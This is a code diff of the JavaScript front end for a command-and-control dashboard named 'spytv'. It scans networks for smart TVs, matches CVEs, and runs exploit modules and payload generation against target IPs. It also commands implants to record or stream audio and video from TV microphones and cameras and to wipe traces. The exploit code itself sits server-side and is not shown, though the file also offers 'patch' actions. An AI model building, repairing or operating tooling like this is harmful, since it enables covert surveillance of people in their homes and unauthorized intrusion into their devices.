+    if (f.includes(key)) return FAMILY_TVTYPE[key];
+  }
+  return null;
+}
+
+function addLog(msg) {
+  const container = document.getElementById('log-container');
+  const time = new Date().toLocaleTimeString();
+  const entry = document.createElement('div');
+  entry.className = 'log-entry';
+  entry.innerHTML = `<span class="time">[${time}]</span> ${msg}`;
+  container.appendChild(entry);
+  container.scrollTop = container.scrollHeight;
+}
+
+// Some endpoints legitimately run for minutes (discovery, exploitation,
+// remediation, feed refresh). Everything else must fail loudly: fetch has no
+// default timeout, so without a budget a dead or blocked C2 left `await api(...)`
+// pending forever — buttons stayed disabled with no error, which read as
+// "the button doesn't work" / "the form hangs after I enter client details".
+// Ordered: first match wins.
+const API_BUDGETS = [
+  // execute_patches() allows 45s PER COMMAND and runs several commands, so a
+  // stack of timeouts can pass 300s without anything being wrong with the C2.
+  [/^\/api\/cve\/patch/, 600000],
+  // measured: full /24 discovery 38s; run_exploit() is capped at 90s server-side
+  // (\b keeps /api/scans — a fast local read — on the short default budget)
+  [/^\/api\/(scan\b|exploit)/, 300000],
+  // engagement starts, PDF reports, feed refresh, whitepaper/artifact renders
+  [/^\/api\/(patch|cve|implant|devices\/tv)/, 300000],
+];
+
+function apiTimeoutFor(path) {
+  const hit = API_BUDGETS.find(([re]) => re.test(path));
+  return hit ? hit[1] : 30000;   // everything else is a quick read or write
+}
+
+async function api(path, method = 'GET', body = null, timeoutMs) {
+  const opts = { method, headers: {} };
+  if (body) {
+    opts.headers['Content-Type'] = 'application/json';
+    opts.body = JSON.stringify(body);
+  }
+  const budget = timeoutMs || apiTimeoutFor(path);
+  const ctrl = new AbortController();
+  const timer = setTimeout(() => ctrl.abort(), budget);
+  opts.signal = ctrl.signal;
+
+  let r;
+  try {
+    r = await fetch(API + path, opts);
+  } catch (e) {
+    clearTimeout(timer);
+    throw new Error(e && e.name === 'AbortError'
+      ? `no response after ${Math.round(budget / 1000)}s — check that the C2 is running`
+      : `cannot reach the C2 (${(e && e.message) || 'network error'})`);
+  }
+  clearTimeout(timer);
+
+  const text = await r.text();
+  let data;
+  try {
+    data = text ? JSON.parse(text) : {};
+  } catch (e) {
+    throw new Error(`${path} answered HTTP ${r.status} with a response that isn't JSON`);
+  }
+  // Keep the historical contract: error bodies are returned, not thrown, so
+  // callers can surface `res.error` / `res.errors`. Only fill in the message
+  // when the server failed without saying why.
+  if (data && typeof data === 'object' && !Array.isArray(data)
+      && !r.ok && !data.error) {
+    data.error = `HTTP ${r.status}${r.statusText ? ' ' + r.statusText : ''}`;
+  }
+  return data;
+}
+
+async function loadDevices() {
+  const data = await api('/api/devices');
+  // Only adopt a real list: an error body (C2 down, 500, timeout) used to
+  // reach renderDevices() and die on devices.map, leaving the grid stale.
+  if (Array.isArray(data)) devices = data;
+  renderDevices();
+}
+
+async function loadClips() {
+  const data = await api('/api/clips');
+  if (Array.isArray(data)) clips = data;
+  document.getElementById('stat-clips').textContent = clips.length;
+  renderDevices();
+}
+
+async function loadLocalIp() {
+  const data = await api('/api/local_ip');
+  if (data && data.ip) localIp = data.ip;
+  document.getElementById('stat-ip').textContent = localIp;
+}
+
+function switchTab(tab) {
+  document.querySelectorAll('.nav-item').forEach(t => {
+    const on = t.getAttribute('onclick') === `switchTab('${tab}')`;
+    t.classList.toggle('active', on);
+    t.setAttribute('aria-selected', on ? 'true' : 'false');
+  });
+  document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+  document.getElementById(`tab-${tab}`).classList.add('active');
+}
+
+function renderDevices() {
+  const grid = document.getElementById('device-grid');
+  const empty = document.getElementById('empty-state');
+  document.getElementById('stat-devices').textContent = devices.length;
+
+  if (devices.length === 0) {
+    grid.innerHTML = '';
+    empty.style.display = 'block';
+    return;
+  }
+  empty.style.display = 'none';
+
+  grid.innerHTML = devices.map(d => {
+    const deviceClips = clips.filter(c => c.device_id === d.id);
+    const videoClips = deviceClips.filter(c => c.kind === 'video');
+    const audioClips = deviceClips.filter(c => c.kind === 'audio');
+    const latestVideo = videoClips[videoClips.length - 1];
+    const latestAudio = audioClips[audioClips.length - 1];
+    const isOnline = d.status === 'online';
+
+    // Family-specific CVE controls: show the CVEs that apply to this TV.
+    const tvType = familyToTvType(d.family || '');
+    const myCves = (tvType && Array.isArray(cveDb[tvType])) ? cveDb[tvType] : [];
+    const patched = d.patched === true;
+
+    return `
+    <div class="device-card ${isOnline ? '' : 'offline'}">
+      <div class="device-header">
+        <div class="device-icon">&#128250;</div>
+        <div class="device-info">
+          <div class="device-ip">${d.ip}</div>
+          <div class="device-meta">${d.family} &bull; ${d.entry}</div>
+        </div>
+        <span class="device-status ${isOnline ? 'online' : 'offline'}">${d.status}</span>
+      </div>
+      <div class="device-body">
+        <div class="video-grid">
+          ${[0,1,2,3].map(i => {
+            const clip = videoClips[videoClips.length - 1 - i];
+            if (clip) {
+              return `<div class="video-thumb">
+                <img src="/api/clip/${clip.id}" alt="thumbnail">
+                ${i === 0 ? '<span class="live-badge">LIVE</span>' : ''}
+              </div>`;
             }
-        }
-        
-        async function sendCommandToAndroid() {
-            const ip = document.getElementById('payload-ip').value.trim();
-            if (!ip) return;
-            
-            alert('ADB deployment requires ADB to be set up on this device.');
-        }
-        
-        function openCaptureModal() {
-            document.getElementById('capture-modal').classList.add('active');
-        }
-        
-        function closeModal() {
-            document.getElementById('capture-modal').classList.remove('active');
-        }
-        
-        async function executeCapture() {
-            const deviceId = document.getElementById('capture-device-id').value.trim();
-            const mode = document.getElementById('capture-mode').value;
-            const duration = document.getElementById('capture-duration').value;
-            
-            const result = await api('/api/command', 'POST', {
-                device_id: deviceId || 'default',
-                command: `record_${mode}`,
-                params: { duration: parseInt(duration) }
-            });
-            
-            if (result.error) {
-                alert(`Capture failed: ${result.error}`);
-            } else {
-                alert(`Capture started (${mode}, ${duration}m)`);
-                closeModal();
-            }
-        }
-        
-        async function loadServerInfo() {
-            const res = await api('/api/host_info');
-            const el = document.getElementById('server-info');
-            
-            if (res.error) {
-                el.innerHTML = `<p class="alert alert-warning">Failed to load server info: ${res.error}</p>`;
-                return;
-            }
-            
-            const uptime = Math.floor((Date.now() - startTime) / 1000);
-            const hours = Math.floor(uptime / 3600);
-            const minutes = Math.floor((uptime % 3600) / 60);
-            
-            el.innerHTML = `
-                <div class="stats-row" style="flex-direction: column; align-items: flex-start;">
-                    <div class="stat" style="flex: none;">
-                        <div class="stat-value" id="srv-ip">--:--:--</div>
-                        <div class="stat-label">Local IP</div>
-                    </div>
-                    <div class="stat" style="flex: none;">
-                        <div class="stat-value">${res.local_ip || '127.0.0.1'}</div>
-                        <div class="stat-label">C2 IP</div>
-                    </div>
-                    <div class="stat" style="flex: none;">
-                        <div class="stat-value" id="srv-port">${res.c2_port || '8443'}</div>
-                        <div class="stat-label">C2 Port</div>
-                    </div>
-                    <div class="stat" style="flex: none;">
-                        <div class="stat-value">${hours > 0 ? hours + 'h ' : ''}${minutes}m</div>
-                        <div class="stat-label">Uptime</div>
-                    </div>
-                    <div class="stat" style="flex: none;">
-                        <div class="stat-value">${res.os || 'Android'}</div>
-                        <div class="stat-label">Platform</div>
-                    </div>
-                </div>
-            `;
-        }
-        
-        function escapeHtml(str) {
-            return String(str || '').replace(/&/g, '&amp;')
-                .replace(/</g, '&lt;').replace(/>/g, '&gt;')
-                .replace(/"/g, '&quot;');
-        }
-        
-        // Init
-        document.getElementById('stat-cves').textContent = '0'; // Static display
-        
-        // Load initial data
-        refreshDevices();
-        loadServerInfo();
-        
-        // Update uptime
-        setInterval(() => {
-            const uptime = Math.floor((Date.now() - startTime) / 1000);
-            const hours = Math.floor(uptime / 3600);
-            const minutes = Math.floor((uptime % 3600) / 60);
-        }, 1000);
-        
-        // Keyboard navigation
-        document.addEventListener('keydown', e => {
-            if (e.key === 'Escape') closeModal();
+            return `<div class="video-thumb">No feed</div>`;
+          }).join('')}
+        </div>
+        <div class="audio-player">
+          <div class="label">Audio Feed</div>
+          ${latestAudio
+            ? `<audio controls src="/api/clip/${latestAudio.id}"></audio>`
+            : '<div style="font-size:11px;color:var(--text-muted)">No audio available</div>'}
+        </div>
+        ${myCves.length ? `
+        <div style="margin-bottom:12px">
+          <div class="label" style="font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:.05em;margin-bottom:6px">
+            Vulnerabilities ${patched ? '&mdash; <span style="color:var(--success)">Patched</span>' : ''}
+          </div>
+          <div class="cve-chips" style="margin-top:0">
+            ${myCves.map(c => `<span class="cve-chip ${(c.severity || '').toLowerCase()}" data-tooltip="${(c.component || '')} — fix: ${c.fixed_in || 'n/a'}">${c.id}</span>`).join('')}
+          </div>
+        </div>` : ''}
+        <div class="controls">
+          <button class="btn btn-primary" onclick="sendCommand('${d.id}', 'record_audio', {duration: selectedDuration})" data-tooltip="Record audio from TV microphone">
+            &#9679; Record Audio
+          </button>
+          <button class="btn btn-primary" onclick="sendCommand('${d.id}', 'record_video', {duration: selectedDuration})" data-tooltip="Record video from TV camera">
+            &#9679; Record Video
+          </button>
+          <button class="btn btn-success" onclick="sendCommand('${d.id}', 'listen')" data-tooltip="Stream live audio from TV">
+            &#127911; Listen
+          </button>
+          <button class="btn btn-success" onclick="sendCommand('${d.id}', 'watch')" data-tooltip="Stream live video from TV">
+            &#128065; Watch
+          </button>
+          <button class="btn btn-danger" onclick="confirmRemove('${d.id}')" data-tooltip="Remove implant and wipe all traces">
+            &#128465; Remove
+          </button>
+          <button class="btn" onclick="confirmPatch('${d.id}')" data-tooltip="Execute CVE remediation for this TV: runs the device family's patch commands, marks its CVEs fixed, and disables the implant capture path">
+            &#128736; Patch
+          </button>
+        </div>
+        <div class="duration-select">
+          <span class="duration-label">Duration:</span>
+          ${[1,2,5,10,15,20].map(m =>
+            `<button class="duration-btn ${m === selectedDuration ? 'active' : ''}" onclick="setDuration(${m})">${m}m</button>`
+          ).join('')}
+        </div>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function setDuration(m) {
+  selectedDuration = m;
+  renderDevices();
+}
+
+async function sendCommand(deviceId, command, params = {}) {
+  addLog(`Sending "${command}" command to ${deviceId}`);
+  await api('/api/command', 'POST', { device_id: deviceId, command, params });
+  addLog(`Command "${command}" delivered to ${deviceId}`);
+}
+
+function confirmRemove(deviceId) {
+  showModal('Remove Implant', `This will remove the implant and wipe all traces from ${deviceId}. Continue?`, async () => {
+    await sendCommand(deviceId, 'remove');
+    addLog(`Remove command sent to ${deviceId}`);
+  });
+}
+
+function confirmPatch(deviceId) {
+  const d = devices.find(x => x.id === deviceId);
+  if (!d) return;
+  const tvType = familyToTvType(d.family || '');
+  showModal('Patch Device', `Run CVE remediation on ${d.ip} (${d.family})? This executes the device family's patch commands, marks matched CVEs as fixed, and disables the implant capture path.`, async () => {
+    // 1. Execute the CVE-specific patch commands against the TV.
+    if (tvType) {
+      addLog(`Patching ${d.ip} (${tvType}) — executing remediation commands...`);
+      try {
+        const res = await api('/api/cve/patch', 'POST', { ip: d.ip, tv_type: tvType, family: d.family });
+        const ok = (res.patches || []).filter(p => p.status === 'ok' || p.status === 'executed').length;
+        addLog(`CVE patch on ${d.ip}: ${ok}/${res.total} commands succeeded — fixed ${(res.cves_fixed || []).join(', ')}`);
+        (res.patches || []).forEach(p => {
+          if (p.status === 'failed' || p.status === 'error') addLog(`  [${p.status}] ${p.command}: ${p.output}`);
         });
-    </script>
+      } catch (e) {
+        addLog(`CVE patch request failed: ${e}`);
+      }
+    }
+    // 2. Tell the implant to disable its own capture path.
+    await sendCommand(deviceId, 'patch');
+    addLog(`Patch complete for ${d.ip}`);
+    loadDevices();
+  });
+}
+
+function showModal(title, message, callback) {
+  document.getElementById('modal-title').textContent = title;
+  document.getElementById('modal-message').textContent = message;
+  document.getElementById('modal').classList.add('active');
+  modalCallback = callback;
+}
+
+function closeModal() {
+  document.getElementById('modal').classList.remove('active');
+  modalCallback = null;
+}
+
+document.getElementById('modal-confirm').addEventListener('click', async () => {
+  if (modalCallback) await modalCallback();
+  closeModal();
+});
+
+async function clearLogs() {
+  document.getElementById('log-container').innerHTML = '';
+  addLog('Logs cleared');
+}
+
+// Network Scan
+function setScanStatus(html) {
+  const el = document.getElementById('scan-results');
+  if (el) el.innerHTML = html;
+}
+
+async function startScan() {
+  const btn = document.getElementById('scan-btn');
+  const cidr = document.getElementById('scan-cidr').value.trim() || null;
+  const label = btn ? btn.textContent : 'Scan';
+
+  addLog(`Starting network scan${cidr ? ' of ' + cidr : ' of the local subnet'}...`);
+  if (btn) { btn.disabled = true; btn.textContent = 'Scanning...'; }
+  setScanStatus(
+    '<p style="color:var(--text-muted);font-size:13px;padding:16px 0">'
+    + 'Scanning — probing hosts and matching CVEs. Results appear here when '
+    + 'discovery finishes (a full /24 takes about a minute).</p>');
+
+  try {
+    const result = await api('/api/scan', 'POST', { cidr });
+    if (result && result.error) {
+      throw new Error((result.errors || [result.error]).join(' '));
+    }
+    const rows = result && Array.isArray(result.results) ? result.results : null;
+    if (!rows) throw new Error('the C2 sent a reply without a results list');
+
+    lastScanResults = rows;
+    const found = (result.found === undefined || result.found === null)
+      ? rows.length : result.found;
+    addLog(`Scan complete: ${found} devices discovered`);
+    renderScanResults(rows);
+  } catch (e) {
+    const msg = (e && e.message) || String(e);
+    addLog(`Scan failed: ${msg}`);
+    setScanStatus(
+      '<div class="alert alert-warning" style="margin-top:12px">Scan failed: '
+      + escapeHtml(msg)
+      + ' — the results above were left unchanged. Check the C2 is reachable, '
+      + 'then try again.</div>');
+  } finally {
+    if (btn) { btn.disabled = false; btn.textContent = label; }
+  }
+}
+
+function renderScanResults(results) {
+  const el = document.getElementById('scan-results');
+  if (!Array.isArray(results)) {
+    // Previously `results.length` threw on undefined, which left the panel
+    // untouched and made a failed scan look like a dead button.
+    setScanStatus('<div class="alert alert-warning">Scan returned no results '
+      + 'list — see the activity log for the reason.</div>');
+    return;
+  }
+  if (results.length === 0) {
+    el.innerHTML = '<p style="color:var(--text-muted);font-size:13px;padding:16px 0">No vulnerable devices found on the network.</p>';
+    return;
+  }
+  el.innerHTML = `
+    <div class="table-scroll">
+    <table class="table">
+      <thead>
+        <tr>
+          <th>IP Address</th>
+          <th>Device Type</th>
+          <th>Open Ports</th>
+          <th>CVEs</th>
+          <th>Status</th>
+          <th>Action</th>
+        </tr>
+      </thead>
+      <tbody>
+        ${results.map(r => {
+          const cves = r.cves || [];
+          const chips = cves.length
+            ? cves.slice(0, 4).map(c => `<span class="cve-chip ${(c.severity || '').toLowerCase()}">${c.id}</span>`).join('')
+              + (cves.length > 4 ? `<span class="cve-chip">+${cves.length - 4}</span>` : '')
+            : '<span style="color:var(--text-muted);font-size:11px">no CVE match</span>';
+          // "Unknown" was printed literally, which read as a missing field.
+          const rawName = String(r.name || r.device_type || '').trim();
+          const deviceLabel = (!rawName || rawName.toLowerCase() === 'unknown')
+            ? 'Unidentified device' : rawName;
+          // Verdict comes from what was proven: open ports alone are not a
+          // vulnerability, so they must not render as an amber "Vulnerable"
+          // badge with an empty CVE column.
+          const status = r.vulnerable
+            ? `<span class="badge badge-warning">${escapeHtml(r.severity || 'Vulnerable')}</span>`
+            : '<span class="badge badge-muted">Not confirmed</span>';
+          return `
+          <tr>
+            <td class="mono">${r.ip}</td>
+            <td>${escapeHtml(deviceLabel)}</td>
+            <td class="mono">${(r.open_ports || []).join(', ')}</td>
+            <td><div class="cve-chips" style="margin-top:0">${chips}</div></td>
+            <td>${status}</td>
+            <td>
+              <button class="btn btn-sm" onclick="checkTarget('${jsAttr(r.ip)}')" data-tooltip="Verify device before exploitation">Check</button>
+              <button class="btn btn-sm btn-primary" onclick="exploitTarget('${jsAttr(r.ip)}', '${jsAttr(deviceLabel)}', '${jsAttr(r.tv_type || '')}')" data-tooltip="Run this family's exploit module against the target and report the real result">Exploit</button>
+              <button class="btn btn-sm btn-success" onclick="patchScanTarget('${jsAttr(r.ip)}', '${jsAttr(r.tv_type || '')}')" data-tooltip="Execute remediation commands for this device family (fixes matched CVEs)">&#128736; Patch</button>
+            </td>
+          </tr>`;
+        }).join('')}
+      </tbody>
+    </table>
+    </div>
+    <div id="scan-action-status"></div>
+  `;
+}
+
+async function checkTarget(ip) {
+  addLog(`Checking ${ip} — read-only verification (no payloads sent)...`);
+  const el = document.getElementById('check-result');
+  el.hidden = false;
+  el.innerHTML = `<h4>Checking ${ip}&hellip;</h4>`;
+  try {
+    const res = await api('/api/check', 'POST', { ip });
+    if (res.error) throw new Error((res.errors || [res.error]).join(' '));
+    const r = res.result || {};
+    if (!r.reachable) {
+      el.innerHTML = `<h4>${ip} &mdash; not reachable</h4>
+        <div style="color:var(--text-muted);font-size:12px">${r.message || 'No open ports — host is down or filtered.'}</div>`;
+      addLog(`Check ${ip}: unreachable`);
+      return;
+    }
+    const cves = r.cves || [];
+    const dry = r.dry_run || {};
+    const dryText = !dry.available ? (dry.reason || 'n/a')
+      : dry.vulnerable === true ? 'vulnerable'
+      : dry.vulnerable === false ? 'not vulnerable'
+      : dry.error ? String(dry.error) : 'completed';
+    el.innerHTML = `
+      <h4>${ip} &mdash; ${r.name || 'device'}
+        ${r.vulnerable
+          ? '<span class="badge badge-warning">VULNERABLE</span>'
+          : '<span class="badge badge-success">NOT CONFIRMED</span>'}</h4>
+      <div class="check-rows">
+        <div class="info-item"><span class="label">Family</span><span class="value">${r.tv_type || '—'}</span></div>
+        <div class="info-item"><span class="label">Open ports</span><span class="value">${(r.open_ports || []).join(', ') || '—'}</span></div>
+        <div class="info-item"><span class="label">CVEs matched</span><span class="value">${cves.length ? cves.map(c => c.id).join(', ') : '0'}</span></div>
+        <div class="info-item"><span class="label">Exploit ready</span><span class="value" style="color:${r.exploit_ready ? 'var(--success)' : 'var(--text-muted)'}">${r.exploit_ready ? 'Yes' : 'No'}</span></div>
+        <div class="info-item"><span class="label">Dry-run check</span><span class="value">${dryText}</span></div>
+        <div class="info-item"><span class="label">Checked at</span><span class="value">${r.checked_at || '—'}</span></div>
+      </div>`;
+    addLog(`Check ${ip}: ${r.vulnerable ? 'vulnerable' : 'not confirmed'} — ${cves.length} CVE(s) matched, exploit ${r.exploit_ready ? 'ready' : 'not ready'}`);
+  } catch (e) {
+    el.innerHTML = `<h4>Check failed for ${ip}</h4>
+      <div style="color:var(--danger);font-size:12px">${e.message || e}</div>`;
+    addLog(`Check ${ip} failed: ${e.message || e}`);
+  }
+}
+
+function saveScanResults() {
+  if (!lastScanResults || lastScanResults.length === 0) {
+    addLog('No scan results to save — run a scan first');
+    return;
+  }
+  const payload = {
+    saved_at: new Date().toISOString(),
+    c2_ip: localIp || null,
+    count: lastScanResults.length,
+    results: lastScanResults,
+  };
+  const blob = new Blob([JSON.stringify(payload, null, 2)], { type: 'application/json' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = `spytv-scan-${new Date().toISOString().slice(0, 19).replace(/[:T]/g, '')}.json`;
+  document.body.appendChild(a);
+  a.click();
+  a.remove();
+  URL.revokeObjectURL(url);
+  addLog(`Scan results saved (${lastScanResults.length} devices)`);
+}
+
+function clearScanResults() {
+  document.getElementById('scan-results').innerHTML = '';
+  addLog('Scan results cleared');
+}
+
+// tv_type -> the value #payload-family expects. Keys are taken from
+// TV_CVE_DATABASE, i.e. the same list /api/exploit resolves.
+const TVTYPE_TO_FAMILY = {
+  'samsung-tizen': 'tizen-dev',
+  'lg-webos': 'webos-dev',
+  'android-tv': 'adb-net',
+  'roku': 'roku-ecp',
+  'vizio': 'vizio-dial',
+  'chromecast': 'chromecast-cast',
+  'hisense': 'hisense',
+  'tcl': 'tcl',
+};
+
+// Row button "Exploit".
+//
+// This used to look up a family in a map keyed 'LG webOS' while the row
+// rendered 'LG webOS TV', so the lookup missed and the `|| 'dlna'` fallback
+// won for *every* device — and DLNA has no entry in TV_CVE_DATABASE or
+// CVE_EXPLOITS, so /api/exploit could only answer 404. The click then merely
+// pre-filled a form and switched tabs, with nothing written to the card, so
+// "the exploit button doesn't work" was literally true: nothing ran and
+// nothing said why.
+async function exploitTarget(ip, deviceType, tvType) {
+  const tv = String(tvType || familyToTvType(deviceType) || '').trim();
+  const family = TVTYPE_TO_FAMILY[tv] || null;
+
+  document.getElementById('payload-ip').value = ip;
+  // select.value only sticks when the option exists; otherwise it silently
+  // keeps whatever was chosen before, which would run the wrong family.
+  if (family) document.getElementById('payload-family').value = family;
+  switchTab('payload');
+
+  const row = (Array.isArray(lastScanResults) ? lastScanResults : [])
+    .find(r => r && r.ip === ip) || {};
+  const confirmed = !!row.vulnerable
+    && Array.isArray(row.cves) && row.cves.length > 0;
+
+  if (!family) {
+    setPayloadStatus(
+      '<div class="alert alert-warning">No TV family could be identified for '
+      + escapeHtml(ip) + ', so no exploit module can be selected. Press '
+      + '<strong>Check</strong> on that row first — it reports what the host '
+      + 'actually is.</div>');
+    addLog(`Exploit on ${ip}: family unknown — run Check before exploiting`);
+    return;
+  }
+
+  if (!confirmed) {
+    setPayloadStatus(
+      '<div class="alert alert-warning">Loaded ' + escapeHtml(ip)
+      + ' as <strong>' + escapeHtml(family) + '</strong>, but the scan found '
+      + 'no confirmed CVE for it, so nothing was run. Press <strong>Check</strong> '
+      + 'to verify the device, or <strong>Exploit</strong> below to run this '
+      + 'family\'s module anyway.</div>');
+    addLog(`Target selected: ${ip} (${family}) — no confirmed CVE, exploit not run`);
+    return;
+  }
+
+  addLog(`Target selected: ${ip} (${family}) — running the exploit module...`);
+  await deployPayload();
+}
+
+// Payload Generator
+// Status lands in #payload-output on the card itself: this button used to
+// report nothing at all, so an empty form, a refused request or a reply
+// without a payload all read as "the Generate button does nothing".
+function setPayloadStatus(html) {
+  const el = document.getElementById('payload-output');
+  if (el) el.innerHTML = html;
+}
+
+async function generatePayload() {
+  const btn = document.getElementById('payload-generate');
+  const ipEl = document.getElementById('payload-ip');
+  const targetIp = (ipEl.value || '').trim();
+  const family = document.getElementById('payload-family').value;
+  const label = btn ? btn.textContent : 'Generate';
+
+  if (!targetIp) {
+    // Inline rather than alert(): a suppressed or missed dialog is invisible,
+    // and the card gave no other sign that anything was expected of you.
+    setPayloadStatus('<div class="alert alert-warning">Enter a target IP '
+      + 'address, then press Generate.</div>');
+    ipEl.focus();
+    addLog('Payload generation skipped: no target IP address');
+    return;
+  }
+
+  if (btn) { btn.disabled = true; btn.textContent = 'Generating...'; }
+  setPayloadStatus(
+    '<p style="color:var(--text-muted);font-size:13px;padding:8px 0">Building '
+    + 'the ' + escapeHtml(family) + ' payload for ' + escapeHtml(targetIp)
+    + '…</p>');
+  addLog(`Generating payload for ${targetIp} (${family})...`);
+
+  try {
+    const result = await api('/api/payload', 'POST',
+                             { target_ip: targetIp, family, c2_ip: localIp });
+    if (result && result.error) {
+      throw new Error((result.errors || [result.error]).join(' '));
+    }
+    const payload = (result && typeof result.payload === 'string'
+                     && result.payload.length) ? result.payload : null;
+    if (!payload) throw new Error('the C2 sent a reply without a payload');
+
+    document.getElementById('payload-text').textContent = payload;
+    // testAiGeneration() retitles this modal; a later payload must not inherit
+    // the previous CVE's title.
+    const title = document.querySelector('#payload-modal .modal-title');
+    if (title) title.textContent = 'Generated Payload';
+    document.getElementById('payload-modal').classList.add('active');
+    setPayloadStatus(
+      '<div class="alert alert-success">Payload ready for ' + escapeHtml(targetIp)
+      + ' — opened in the preview below.</div>');
+    addLog(`Payload generated for ${targetIp} (${family})`);
+  } catch (e) {
+    const msg = (e && e.message) || String(e);
+    addLog(`Payload generation failed: ${msg}`);
+    setPayloadStatus(
+      '<div class="alert alert-warning">Payload generation failed: '
+      + escapeHtml(msg) + '</div>');
+  } finally {
+    if (btn) { btn.disabled = false; btn.textContent = label; }
+  }
+}
+
+async function deployPayload() {
+  const btn = document.getElementById('payload-exploit');
+  const ipEl = document.getElementById('payload-ip');
+  const targetIp = (ipEl.value || '').trim();
+  const family = document.getElementById('payload-family').value;
+  const label = btn ? btn.textContent : 'Exploit';
+  if (!targetIp) {
+    setPayloadStatus('<div class="alert alert-warning">Enter a target IP '
+      + 'address, then press Exploit.</div>');
+    ipEl.focus();
+    addLog('Exploit skipped: no target IP address');
+    return;
+  }
+  const tvType = familyToTvType(family);
+  if (btn) { btn.disabled = true; btn.textContent = 'Running...'; }
+  setPayloadStatus('<p style="color:var(--text-muted);font-size:13px;padding:8px 0">'
+    + 'Running the exploit module against ' + escapeHtml(targetIp) + '…</p>');
+  addLog(`Exploit on ${targetIp} (${family}) — running the exploit module...`);
+  try {
+    const res = await api('/api/exploit', 'POST',
+                          // `|| ''` not `|| null`: a null tv_type arrives as the
+                          // string 'None' server-side and skips family lookup.
+                          { ip: targetIp, family, tv_type: tvType || '' });
+    if (res.error || res.attempted === false) {
+      const why = res.error || 'no module available';
+      addLog(`Exploit not run on ${targetIp}: ${why}`);
+      setPayloadStatus('<div class="alert alert-warning">Exploit not run: '
+        + escapeHtml(why) + '</div>');
+      return;
+    }
+    const dur = (res.duration_s !== undefined && res.duration_s !== null)
+      ? ` in ${res.duration_s}s` : '';
+    if (res.success) {
+      addLog(`Exploit succeeded on ${targetIp} (${res.tv_type})${dur}`);
+      setPayloadStatus('<div class="alert alert-success">Exploit succeeded on '
+        + escapeHtml(targetIp) + ' (' + escapeHtml(res.tv_type || tvType) + ')' + dur + '</div>');
+    } else if (res.timed_out) {
+      const why = res.error || 'module exceeded its time budget';
+      addLog(`Exploit timed out on ${targetIp} (${res.tv_type})${dur}: ${why}`);
+      setPayloadStatus('<div class="alert alert-warning">Exploit timed out'
+        + dur + ': ' + escapeHtml(why) + '</div>');
+    } else {
+      const why = res.error ? ': ' + res.error : '';
+      addLog(`Exploit failed on ${targetIp} (${res.tv_type})${dur}${why}`);
+      setPayloadStatus('<div class="alert alert-warning">Exploit failed on '
+        + escapeHtml(targetIp) + dur + (res.error ? ': ' + escapeHtml(res.error) : '') + '</div>');
+    }
+  } catch (e) {
+    const msg = (e && e.message) || String(e);
+    addLog(`Exploit request failed: ${msg}`);
+    setPayloadStatus('<div class="alert alert-warning">Exploit request failed: '
+      + escapeHtml(msg) + '</div>');
+  } finally {
+    if (btn) { btn.disabled = false; btn.textContent = label; }
+  }
+}
+
+function closePayloadModal() {
+  document.getElementById('payload-modal').classList.remove('active');
+}
+
+function copyPayload() {
+  const text = document.getElementById('payload-text').textContent;
+  navigator.clipboard.writeText(text).then(() => {
+    addLog('Payload copied to clipboard');
+  });
+}
+
+// CVE Monitor
+async function loadCveDb() {
+  // Static family -> CVE mapping used for device-card vulnerability chips.
+  try {
+    const rows = await api('/api/cves');
+    cveDb = {};
+    (rows || []).forEach(c => {
+      if (!cveDb[c.tv_type]) cveDb[c.tv_type] = [];
+      cveDb[c.tv_type].push(c);
+    });
+  } catch (e) { /* non-fatal */ }
+}
+
+async function loadCVEs() {
+  const cves = await api('/api/cves');
+  renderCVEs(cves);
+}
+
+function renderCVEs(cves) {
+  const el = document.getElementById('cve-results');
+  if (!Array.isArray(cves)) {
+    // A failed /api/cves reply is an object, not a list; `cves.length` was
+    // undefined so the empty-check passed and `cves.map` threw, blanking the
+    // tab with no explanation.
+    el.innerHTML = '<div class="alert alert-warning">CVE database could not be loaded'
+      + (cves && cves.error ? ' &mdash; ' + escapeHtml(cves.error) : '')
+      + '. Check the C2, then retry.</div>';
+    return;
+  }
+  if (cves.length === 0) {
+    el.innerHTML = '<p style="color:var(--text-muted);font-size:13px;padding:16px 0">No CVEs in database.</p>';
+    return;
+  }
+  el.innerHTML = `
+    <div class="table-scroll">
+    <table class="table">
+      <thead>
+        <tr>
+          <th>CVE ID</th>
+          <th>Device</th>
+          <th>Severity</th>
+          <th>Score</th>
+          <th>Component</th>
+          <th>Fixed In</th>
+          <th>Action</th>
+        </tr>
+      </thead>
+      <tbody>
+        ${cves.map(c => `
+          <tr>
+            <td><a class="mono" href="https://nvd.nist.gov/vuln/detail/${c.id}" target="_blank" style="color:var(--accent);text-decoration:none">${c.id} &#8599;</a></td>
+            <td>${c.device_name}</td>
+            <td><span class="badge ${c.severity === 'CRITICAL' ? 'badge-danger' : c.severity === 'HIGH' ? 'badge-warning' : 'badge-success'}">${c.severity}</span></td>
+            <td>${c.score}</td>
+            <td>${c.component}</td>
+            <td>${c.fixed_in}</td>
+            <td>
+              <button class="btn btn-sm btn-success" onclick="patchForCVE('${c.tv_type}', '${c.id}')" data-tooltip="Patch this CVE on matched devices found in the latest scan">&#128736; Patch</button>
+            </td>
+          </tr>
+        `).join('')}
+      </tbody>
+    </table>
+    </div>
+  `;
+}
+
+async function updateCVEs() {
+  addLog('Updating CVE feed from NVD (runs in background)...');
+  const result = await api('/api/cve/update', 'POST', {});
+  const status = document.getElementById('cve-update-status');
+  status.style.display = 'flex';
+  status.textContent = result.status === 'updating'
+    ? 'Update in progress — new CVEs will appear in the feed shortly...'
+    : 'Update complete.';
+  addLog('CVE update started');
+  // Poll the feed until the background update completes.
+  let tries = 0;
+  const timer = setInterval(async () => {
+    tries++;
+    const done = await loadFeed(true);
+    if (!done || done.updating === false || tries > 40) {
+      clearInterval(timer);
+      const msg = (feedData && feedData.last_result) || 'Update finished';
+      status.textContent = `${msg} — ${feedData ? feedData.count : 0} CVEs in feed (see CVE_UPDATES.log)`;
+      addLog(`CVE update: ${msg}`);
+      loadCVEs();
+    }
+  }, 3000);
+}
+
+async function patchForCVE(tvType, cveId) {
+  // Patch all matching devices from the latest scan for this family.
+  let target = null;
+  try {
+    const scansData = await api('/api/scans');
+    const flat = [];
+    (scansData || []).forEach(s => Array.isArray(s) ? flat.push(...s) : flat.push(s));
+    target = flat.find(r => r.tv_type === tvType && r.ip) || flat.find(r => r.tv_type === tvType);
+  } catch (e) { /* ignore */ }
